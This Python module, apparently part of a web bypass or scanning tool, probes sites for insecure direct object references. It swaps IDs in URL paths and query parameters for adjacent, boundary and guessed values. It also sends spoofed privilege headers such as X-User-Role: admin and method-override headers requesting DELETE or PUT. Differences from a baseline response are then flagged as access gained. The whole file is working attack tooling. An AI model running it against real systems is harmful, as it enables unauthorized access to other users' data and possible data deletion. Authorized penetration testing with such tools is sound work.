"""
IDOR (Insecure Direct Object Reference) bypass module.

Strategy:
  1. Detect numeric or UUID IDs in URL path or query parameters
  2. Swap IDs with adjacent, boundary, admin/known IDs
  3. Apply header-based role escalation on the original URL
  4. Compare responses to baseline — status change or significant body
     length difference indicates a potential IDOR

ID sources probed:
  - /api/resource/123          path numeric
  - /api/resource/uuid-here    path UUID
  - ?id=123 / ?user_id=456     query string params

Header tricks:
  - X-User-Role: admin
  - X-Admin: true
  - X-Privileged: 1
  - X-HTTP-Method-Override: DELETE / PUT
"""

import asyncio
import re
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode

import httpx

from . import BypassResult

try:
    from scope_validator import ScopeValidator
except ImportError:
    ScopeValidator = None
try:
    from rate_limiter import RateLimiter
except ImportError:
    RateLimiter = None

# ---------------------------------------------------------------------------
# ID variant generation
# ---------------------------------------------------------------------------

def _id_variants(original_id: str) -> list[tuple[str, str]]:
    """Return (category, variant_id) pairs to test."""
    variants: list[tuple[str, str]] = []
    try:
        n = int(original_id)
        variants += [
            ("adjacent_ids", str(n - 1)),
            ("adjacent_ids", str(n + 1)),
            ("adjacent_ids", str(n - 2)),
            ("adjacent_ids", str(n + 2)),
            ("boundary_ids", "0"),
            ("boundary_ids", "1"),
            ("boundary_ids", "-1"),
            ("boundary_ids", "99999999"),
        ]
    except ValueError:
        pass

    variants += [
        ("guid_swap",       "00000000-0000-0000-0000-000000000001"),
        ("guid_swap",       "11111111-1111-1111-1111-111111111111"),
        ("string_variants", "admin"),
        ("string_variants", "root"),
        ("string_variants", "test"),
        ("string_variants", "null"),
        ("string_variants", "undefined"),
        ("wildcard",        "*"),
        ("wildcard",        "%2A"),
    ]
    return variants


def _header_tricks() -> list[tuple[str, dict[str, str]]]:
    return [
        ("header_role",     {"X-User-Role": "admin"}),
        ("header_role",     {"X-User-Role": "superuser"}),
        ("header_role",     {"X-Admin": "true"}),
        ("header_role",     {"X-Privileged": "1"}),
        ("header_override", {"X-HTTP-Method-Override": "DELETE"}),
        ("header_override", {"X-HTTP-Method-Override": "PUT"}),
        ("header_user_id",  {"X-User-Id": "1"}),
        ("header_user_id",  {"X-User-Id": "0"}),
        ("header_user_id",  {"X-Forwarded-User": "admin"}),
    ]

# ---------------------------------------------------------------------------
# IDORBypass
# ---------------------------------------------------------------------------

class IDORBypass:
    name = "IDOR"
    description = "Insecure Direct Object Reference — ID swapping and header tricks"
    requires_param = False

    async def detect(
        self,
        target: str,
        client: httpx.AsyncClient,
        limiter,
    ) -> bool:
        """Return True if a numeric/UUID ID is detected in the URL."""
        parsed = urlparse(target)
        if re.search(r"/\d{1,12}(/|$|\?|#)", parsed.path):
            return True
        if re.search(r"/[a-f0-9\-]{8,36}(/|$)", parsed.path):
            return True
        qs = parse_qs(parsed.query)
        id_keywords = ("id", "user", "uid", "account", "profile", "order", "item")
        return any(any(kw in k.lower() for kw in id_keywords) for k in qs)

    async def scan(
        self,
        target: str,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
        param: Optional[str] = None,
    ) -> list[BypassResult]:
        parsed = urlparse(target)
        path   = parsed.path

        # Find ID in path
        id_match        = re.search(r"/(\d{1,12})(/|$|\?|#)", path)
        uuid_match      = re.search(r"/([a-f0-9\-]{8,36})(/|$)", path)
        qs_params       = parse_qs(parsed.query, keep_blank_values=True)
        id_keywords     = ("id", "user", "uid", "account", "profile", "order", "item")
        id_qs_params    = {
            k: v[0] for k, v in qs_params.items()
            if any(kw in k.lower() for kw in id_keywords)
        }

        tasks: list[tuple[str, str, str, dict]] = []

        # Path numeric ID swapping
        if id_match:
            original_id = id_match.group(1)
            for category, variant_id in _id_variants(original_id):
                swapped = re.sub(
                    r"(/)(" + re.escape(original_id) + r")(/|$)",
                    rf"\g<1>{variant_id}\g<3>",
                    path,
                )
                url = target.replace(path, swapped, 1)
                tasks.append((category, variant_id, url, {}))

        # Path UUID swapping
        elif uuid_match:
            original_uuid = uuid_match.group(1)
            swap_uuids = [
                "00000000-0000-0000-0000-000000000001",
                "11111111-1111-1111-1111-111111111111",
                "ffffffff-ffff-ffff-ffff-ffffffffffff",
            ]
            for swap in swap_uuids:
                url = target.replace(original_uuid, swap, 1)
                tasks.append(("uuid_swap", swap, url, {}))

        # Query param ID swapping
        for p_name, p_val in id_qs_params.items():
            for category, variant_id in _id_variants(p_val):
                new_qs = dict(qs_params)
                new_qs[p_name] = [variant_id]
                new_query = urlencode({k: v[0] for k, v in new_qs.items()})
                if parsed.query:
                    url = target.replace(parsed.query, new_query, 1)
                else:
                    url = f"{target}&{p_name}={variant_id}"
                tasks.append((category, f"{p_name}={variant_id}", url, {}))

        # Header tricks always applied to original URL
        for tech, headers in _header_tricks():
            tasks.append((tech, str(headers), target, headers))

        if not tasks:
            return [BypassResult(
                success=False, vuln_type="idor", technique="no_id_found",
                category="idor", payload=target, url=target,
                status_code=0, evidence="",
                note="No numeric/UUID ID found. Use --param to specify a parameter.",
            )]

        # Baseline
        baseline_resp = await self._get(target, {}, client, sem, limiter)
        baseline_status = baseline_resp["status"] if baseline_resp else 0
        baseline_len    = baseline_resp["len"]    if baseline_resp else 0

        coros = [
            self._get(url, h, client, sem, limiter)
            for (_, _, url, h) in tasks
        ]
        raw = await asyncio.gather(*coros, return_exceptions=True)

        results: list[BypassResult] = []
        for (category, payload, url, _), resp in zip(tasks, raw):
            if isinstance(resp, Exception) or resp is None:
                results.append(BypassResult(
                    success=False, vuln_type="idor", technique="id_swap",
                    category=category, payload=payload, url=url,
                    status_code=0, evidence="", note="request_error",
                ))
                continue

            status_change  = resp["status"] == 200 and baseline_status != 200
            len_diff       = abs(resp["len"] - baseline_len)
            content_diff   = resp["status"] == 200 and len_diff > 50 and baseline_status == 200
            success        = status_change or content_diff

            results.append(BypassResult(
                success=success,
                vuln_type="idor",
                technique="id_swap",
                category=category,
                payload=payload,
                url=url,
                status_code=resp["status"],
                evidence=resp["text"][:200],
                note=(
                    f"baseline={baseline_status}/{baseline_len}b "
                    f"new={resp['status']}/{resp['len']}b"
                ),
            ))
        return results

    async def _get(
        self,
        url: str,
        headers: dict,
        client: httpx.AsyncClient,
        sem: asyncio.Semaphore,
        limiter,
    ) -> Optional[dict]:
        async with sem:
            try:
                async with limiter.http():
                    resp = await client.get(url, headers=headers)
                    limiter.adapt_to_response(resp)
                return {"status": resp.status_code, "len": len(resp.text), "text": resp.text}
            except httpx.RequestError:
                return None
